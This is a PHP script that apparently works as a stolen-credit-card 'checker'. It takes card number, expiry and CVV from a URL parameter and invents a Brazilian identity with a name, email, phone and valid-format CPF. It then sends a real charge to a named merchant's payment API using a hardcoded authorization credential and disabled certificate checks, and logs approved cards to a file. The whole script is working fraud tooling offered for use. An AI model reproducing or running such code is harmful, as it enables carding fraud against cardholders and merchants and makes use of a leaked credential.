
<?php
deletarCookies();
error_reporting(0);
ignore_user_abort(true);

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function deletarCookies() {
    if (file_exists("cookies.txt")) {
        unlink("cookies.txt");
    }
}

function gerarNome() {
    $nomes = ['Joao', 'Maria', 'Pedro', 'Ana', 'Carlos', 'Fernanda', 'Lucas', 'Juliana', 'Ricardo', 'Patricia'];
    $sobrenomes = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Almeida', 'Pereira', 'Costa', 'Lima'];
    return $nomes[array_rand($nomes)] . ' ' . $sobrenomes[array_rand($sobrenomes)];
}

function gerarEmail($nome) {
    $primeiroNome = strtolower(explode(' ', $nome)[0]);
    $numeros = rand(1000, 9999);
    $dominios = ['gmail.com', 'hotmail.com', 'outlook.com', 'yahoo.com.br'];
    return $primeiroNome . $numeros . '@' . $dominios[array_rand($dominios)];
}

function gerarTelefone() {
    $ddd = ['11', '21', '31', '41', '51', '61', '71', '81', '91'];
    return $ddd[array_rand($ddd)] . rand(900000000, 999999999);
}

function gerarCPF() {
    $n1 = rand(0, 9);
    $n2 = rand(0, 9);
    $n3 = rand(0, 9);
    $n4 = rand(0, 9);
    $n5 = rand(0, 9);
    $n6 = rand(0, 9);
    $n7 = rand(0, 9);
    $n8 = rand(0, 9);
    $n9 = rand(0, 9);
    
    $d1 = $n9*2 + $n8*3 + $n7*4 + $n6*5 + $n5*6 + $n4*7 + $n3*8 + $n2*9 + $n1*10;
    $d1 = 11 - ($d1 % 11);
    if ($d1 >= 10) $d1 = 0;
    
    $d2 = $d1*2 + $n9*3 + $n8*4 + $n7*5 + $n6*6 + $n5*7 + $n4*8 + $n3*9 + $n2*10 + $n1*11;
    $d2 = 11 - ($d2 % 11);
    if ($d2 >= 10) $d2 = 0;
    
    return sprintf('%d%d%d%d%d%d%d%d%d%d%d', $n1, $n2, $n3, $n4, $n5, $n6, $n7, $n8, $n9, $d1, $d2);
}

function gerarNascimento() {
    $ano = rand(1970, 2002);
    $mes = str_pad(rand(1, 12), 2, '0', STR_PAD_LEFT);
    $dia = str_pad(rand(1, 28), 2, '0', STR_PAD_LEFT);
    return "$ano-$mes-$dia";
}

function gerarClienteUID() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
    );
}

$lista = $_GET['lista'];
$lista = str_replace(" ", "|", $lista);
$lista = str_replace("%20", "|", $lista);
$lista = preg_replace('/[ -]+/', '-', $lista);
$lista = str_replace("/", "|", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];

switch($ano){
    case 2024: $ano = "24"; break;
    case 2025: $ano = "25"; break;
    case 2026: $ano = "26"; break;
    case 2027: $ano = "27"; break;
    case 2028: $ano = "28"; break;
    case 2029: $ano = "29"; break;
    case 2030: $ano = "30"; break;
    case 2031: $ano = "31"; break;
    case 2032: $ano = "32"; break;
    case 2033: $ano = "33"; break;
    case 2034: $ano = "34"; break;
    case 2035: $ano = "35"; break;
    case 2036: $ano = "36"; break;
    case 2037: $ano = "37"; break;
    case 2038: $ano = "38"; break;
    case 2039: $ano = "39"; break;
}

$nomeCompleto = gerarNome();
$primeiroNome = explode(' ', $nomeCompleto)[0];
$ultimoNome = explode(' ', $nomeCompleto)[1] ?? 'Silva';
$email = gerarEmail($nomeCompleto);
$telefone = gerarTelefone();
$cpf = gerarCPF();
$nascimento = gerarNascimento();
$cliente_uid = gerarClienteUID();

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://influwin.com.br/api/public/process-payment');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"produto":"Elosdoc","tipo_pg":"nao-recorrente","parcelas":1,"nome":"' . $primeiroNome . ' ' . substr($ultimoNome, 0, 3) . '","email":"' . $email . '","telefone":"' . $telefone . '","cpf":"' . $cpf . '","nascimento":"' . $nascimento . '","cartao_numero":"' . $cc . '","cartao_cvv":"' . $cvv . '","cartao_bin":"' . substr($cc, 0, 6) . '","plano_valor_real":4990,"cartao_vencimento":"' . $mes . '/' . (strlen($ano) == 2 ? '20' . $ano : $ano) . '","cartao_nome":"' . strtoupper($primeiroNome . ' ' . substr($ultimoNome, 0, 3)) . '","cliente_uid":"' . $cliente_uid . '"}');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: */*',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization: Basic YWNlc3NvcHJvZy5wdzpQd3NlbmhhMSE=',
    'content-type: application/json',
    'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'referer: https://influwin.com.br/checkout/consulta-avulsa'
));

$response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

$response_data = json_decode($response, true);
$cartao_formatado = $cc . '|' . $mes . '|' . $ano . '|' . $cvv;

if ($http_code == 200 && (!isset($response_data['error']) || $response_data['error'] === false || isset($response_data['success']))) {
    file_put_contents('cx2dorainzinho.txt', $cartao_formatado . PHP_EOL, FILE_APPEND);
    $codigo = isset($response_data['details']['returnCode']) ? $response_data['details']['returnCode'] : (isset($response_data['Rapidoc']) ? $response_data['Rapidoc'] : '00');
    echo '<span class="badge badge-success">✅ APROVADO</span> ' . $cartao_formatado . ' | <span class="transation badge-success">Pagamento Autorizado Com Sucesso(' . $codigo . ')</span>';
} else {
    $mensagem = 'Pagamento Recusado';
    if (isset($response_data['details']['returnMessage'])) {
        $mensagem = $response_data['details']['returnMessage'];
    } elseif (isset($response_data['message'])) {
        $mensagem = $response_data['message'];
    } elseif (isset($response_data['error']) && is_string($response_data['error'])) {
        $mensagem = $response_data['error'];
    }
    $codigo = '';
    if (isset($response_data['details']['returnCode']) && !empty($response_data['details']['returnCode'])) {
        $codigo = ' (' . $response_data['details']['returnCode'] . ')';
    } elseif (isset($response_data['Cielo'])) {
        $codigo = ' (' . $response_data['Cielo'] . ')';
    }
    echo '<span class="badge badge-danger">❌ REPROVADO</span> ' . $cartao_formatado . ' | <span class="transation badge-danger">' . $mensagem . $codigo . '</span>';
}

if (file_exists("cookies.txt")) {
    unlink("cookies.txt");
}
?>
